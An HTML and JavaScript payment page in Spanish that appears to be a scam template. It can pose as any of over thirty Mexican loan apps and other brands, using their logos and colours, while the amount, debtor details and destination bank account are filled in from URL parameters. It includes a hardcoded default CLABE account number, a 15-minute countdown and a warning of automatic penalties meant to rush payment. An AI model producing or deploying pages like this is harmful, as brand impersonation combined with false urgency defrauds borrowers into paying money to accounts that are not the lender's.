<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Detalle de Pago</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f1f5f9; padding: 1rem; }
        .detail-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); text-align: center; }
    </style>
</head>
<body>

    <div class="detail-card">
        <!-- Encabezado con color dinámico -->
        <div id="header-bg" class="pt-8 pb-5 text-center text-white flex flex-col items-center justify-center">
            <div class="w-16 h-16 bg-white rounded-2xl mb-2 flex items-center justify-center overflow-hidden border-2 border-white/20 shadow-md">
                <img id="img-app" src="" class="w-full h-full object-cover">
            </div>
            <h2 id="txt-app" class="text-lg font-black uppercase tracking-wider"></h2>
        </div>

        <!-- Contenido de Pago -->
        <div class="p-6 space-y-5">
            <div>
                <span class="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">Monto a Pagar</span>
                <span id="txt-monto" class="text-3xl font-black text-slate-800">$0.00</span>
                <span id="timer" class="text-sm font-black text-red-500 block mt-0.5">14:59</span>
            </div>

            <!-- Tabla de datos -->
            <div class="bg-slate-50 rounded-[1.8rem] p-4 text-left space-y-3 border border-slate-100 text-xs font-bold text-slate-700">
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Cliente</span>
                    <span id="txt-cliente" class="uppercase text-slate-900"></span>
                </div>
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Teléfono</span>
                    <span id="txt-tel" class="text-slate-900"></span>
                </div>
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Banco / Método</span>
                    <span id="txt-banco" class="font-black text-slate-900">MIFEL</span>
                </div>

                <!-- Bloque de transferencia más compacto (Link / CLABE) -->
                <div class="pt-1 text-center space-y-1">
                    <span class="text-[8px] text-gray-400 uppercase tracking-wider block font-black">Liga de Pago / Número</span>
                    <div class="flex items-center justify-between bg-white border border-slate-200/80 rounded-lg py-1.5 px-3 shadow-sm max-w-[280px] mx-auto">
                        <span id="txt-clabe" class="text-blue-600 font-bold text-xs tracking-tight truncate max-w-[210px]"></span>
                        <button onclick="copiarClabe()" class="text-blue-500 hover:text-blue-700 transition-colors p-1 bg-blue-50 rounded-md shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Advertencia inferior -->
            <p class="text-[9px] font-black text-red-500 uppercase leading-tight px-4">
                ⚠️ Advertencia: Realiza el pago en menos de 15 minutos para evitar penalizaciones automáticas.
            </p>
        </div>
    </div>

    <script>
        const APPS = {
            baubap: { name: 'Baubap', color: '#10b981', img: 'https://play-lh.googleusercontent.com/8bT4kFxFzPy078zlO7h97O2fTBLu5NTemiSr2oxtMnRdZu8OFr5Js7HJ_rMXkL5N0DfHiaTH2vGMhXn353ol=w240-h480-rw' },
            vivus: { name: 'Vivus', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/FpMOQImteiJbZywbqSs6SNQ0ChSTrKNrdQ8I1y9oZjfG8oNv8UbdY-arrWTjFWOU7xZFhOsZ3qkL5UM2JWxO=w240-h480-rw' },
            efectivohoy: { name: 'Efectivo Hoy', color: '#10b981', img: 'https://play-lh.googleusercontent.com/jVIVA0_ESxvZoa1KZiMlVE6AZF333aD9SHdyUEoPabhC-QvI9Yoj9E78PBIC0DWUZeE8_CFF9oncLVveolJg' },
            inuprestamos: { name: 'iNU Prestamos', color: '#820ad1', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/44/c4/c9/44c4c962-5c65-f333-d9d1-d7fd9ddff574/Placeholder.mill/400x400bb-75.webp' },
            okcredito: { name: 'OK CRÉDITO', color: '#0284c7', img: 'https://app-prestamos.mx/wp-content/uploads/2022/10/okcredito.png' },
            creditala: { name: 'CREDITALA', color: '#ea580c', img: 'https://play-lh.googleusercontent.com/bIY9u_xUX_Tu3R8CSyEG336yp-1HIczE2iXKqoX-6C3XIojeudqF_1rJmtR3IrImGGlQW4FFWJBNIb8SouUo=w480-h960-rw' },
            affluente: { name: 'Affluente Financiero', color: '#0f766e', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/33/c0/06/33c00607-cb57-559f-f1a3-8c914e6546b9/AppIcon-0-0-1x_U007emarketing-0-6-0-85-220.png/400x400ia-75.webp' },
            prestamos: { name: 'Préstamos', color: '#a3e635', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
            dinero: { name: 'Préstamos de Dinero', color: '#1e40af', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/31/78/92/317892a1-467e-c2c7-b7c5-be2a58b7d358/AppIcon-1x_U007ephone-0-1-0-85-220-0.png/400x400ia-75.webp' },
            nu: { name: 'Préstamos NU', color: '#820ad1', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
            talacred: { name: 'Tala Crédito', color: '#06b6d4', img: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' },
            mercadona: { name: 'MERCADONA', color: '#007a33', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/25/9d/8e/259d8e75-f5f7-eefb-73de-0f5d693e7544/Placeholder.mill/400x400bb-75.webp' },
            tilt: { name: 'Tilt', color: '#3b82f6', img: 'https://play-lh.googleusercontent.com/GALkEmiM5acYbAGJVkkma1Ij5rDW6CWhSKeGFLcXddAtK3uXmgCPxvfAnVxe325A2_b80xRieYiGjktUw5ajww=w480-h960-rw' },
            dida: { name: 'DidaPréstamos', color: '#0057ff', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/e2/14/27/e21427df-1404-f93c-c8b9-230ef12d4870/Placeholder.mill/400x400bb-75.webp' },
            rapidos: { name: 'Préstamos rápidos', color: '#10b981', img: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/7f/68/39/7f683903-e675-6fbc-56fa-64d6fb206e2d/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/400x400ia-75.webp' },
            worldmox: { name: 'Worldmoxpro cash', color: '#1e293b', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOQ9FrkHlgWkaMJt_Za2IN0R5Z0UamJ_VQKg&s' },
            movil: { name: 'Movil Cash', color: '#22c55e', img: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
            cashcredit: { name: 'Cash Credit', color: '#f59e0b', img: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
            stori: { name: 'Stori Crédito', color: '#7c3aed', img: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
            facil: { name: 'Fácil Préstamo', color: '#0ea5e9', img: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
            tala: { name: 'Tala Préstamos', color: '#fb923c', img: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' },
            cashmexico: { name: 'CashMexico', color: '#0284c7', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/d8/42/ce/d842ce89-fdc0-0481-3e96-b6f9bb94264b/Placeholder.mill/200x200bb-75.webp' },
            mexicash: { name: 'MexiCash Credit', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/pyd3hYcSNZksg7oEd9AjeALNlROuZ8YNDxh9LxZq9OIS6ZLCm-0v3zUC_Lr853qecp1YIyETblf7qH56dUsrqg=w240-h480-rw' },
            okdinero: { name: 'Ok Dinero', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/EXEm3GadKgOrUnCJnirIMk9M-P6cs3ZyvHT3Nts6JQgXhuD2V2Tnh20gF7yDYAJ-8os3WSUhj9m3H32PeqEi=w240-h480-rw' },
            popprestamo: { name: 'Pop Prestamo', color: '#10b981', img: 'https://play-lh.googleusercontent.com/vCq8rMZdfA5fs6AbSor_JnaO09ayCFKMSo3a1BeEejpOh2M4AKHAJdNJ1PwHwJR0GowgtrLY3_fZHWv82GM-Pg=s48-rw' },
            quickfondo: { name: 'Quick Fondo VIP', color: '#1e293b', img: 'https://play-lh.googleusercontent.com/z7-COMawYn-C3LIMI3FPW5bgZFvM6isO645XpN-hi28_z0DRanD5-kelGteObQfCBgb1IK4j0aAGCgRJf8IUZp8=w240-h480-rw' },
            efecrapid: { name: 'EfecRápid', color: '#10b981', img: 'https://play-lh.googleusercontent.com/bUynM4jDyjTZvRtPfw97OlJIrulfk15d9nTJk5dvW7FK2gOAt1trg4XiBfpWPQF8nJaDRkLIhSBnq6ROJHeTNUU=w240-h480-rw' },
            raizcredito: { name: 'Raíz Credito', color: '#0f766e', img: 'https://play-lh.googleusercontent.com/77ZpYo8WaB69S4gRdEygsDJk7DSFG_hscSUz3Am4174uMO1FcZTw6vKYdIz9r7ZltGN5KJBZrAo41v6ZRK87dg=w240-h480-rw' },
            rapidocredito: { name: 'Rápido Credito', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/mGzANDEBQJIf58Iebjnh2ezSCQfgiemGxL--TU0qp4L77WULY9bn8ZuGAOpUlr1KSdTpdhY7nkP98_uBhTiwHUA=s48-rw' },
            clickprestamo: { name: 'Click Prestamo', color: '#ea580c', img: 'https://clicredito.mx/assets/frontend/images/logo.svg' },
            pesitolisto: { name: 'Pesito Listo', color: '#f59e0b', img: 'https://play-lh.googleusercontent.com/lxdzFwm5u4VslPsRLYDM8KDA4jASLz-NlZHs3tSjZ5XlCM2rk_8oLIt_my_jMbVrwOGCp4ktxOfaqycb60lnEME=w240-h480-rw' },
            cashrapido: { name: 'Cash rápido', color: '#0284c7', img: 'https://play-lh.googleusercontent.com/zMl14tbZn7N4N3I7lwEnJPzMWClAFvwgRZUTTt4LNo5bRBaZf5DBFr3qm2kCknRxc4kb6mm_sNY7Tw7Hi2GR=s48-rw' },
            crecidinero: { name: 'Creci Dinero', color: '#820ad1', img: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/36/0a/a3/360aa3b3-b333-7d89-cf62-e163d11b56af/Placeholder.mill/200x200bb-75.webp' }
        };

        const p = new URLSearchParams(window.location.search);
        
        const appKey = p.get('app') || 'baubap';
        const appInfo = APPS[appKey] || APPS['baubap'];

        document.getElementById('header-bg').style.backgroundColor = appInfo.color;
        document.getElementById('img-app').src = appInfo.img;
        document.getElementById('txt-app').innerText = appInfo.name;

        const montoFormateado = parseFloat(p.get('m') || 0).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        document.getElementById('txt-monto').innerText = '$' + montoFormateado;
        document.getElementById('txt-cliente').innerText = decodeURIComponent(p.get('n') || 'CLIENTE');
        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
        document.getElementById('txt-clabe').innerText = p.get('c') || '042180010077990354';

        let bancoLimpio = p.get('b') || 'MIFEL';
        bancoLimpio = bancoLimpio.replace(/[1234]/g, '').trim(); 
        document.getElementById('txt-banco').innerText = bancoLimpio;

        let tiempo = 15 * 60 - 1;
        const timerElement = document.getElementById('timer');
        const interval = setInterval(() => {
            let minutos = Math.floor(tiempo / 60);
            let segundos = tiempo % 60;
            segundos = segundos < 10 ? '0' + segundos : segundos;
            timerElement.innerText = `${minutos}:${segundos}`;
            if (tiempo <= 0) clearInterval(interval);
            tiempo--;
        }, 1000);

        function copiarClabe() {
            const clabe = document.getElementById('txt-clabe').innerText;
            navigator.clipboard.writeText(clabe).then(() => {
                alert('Copiado al portapapeles');
            });
        }
    </script>
</body>
</html>
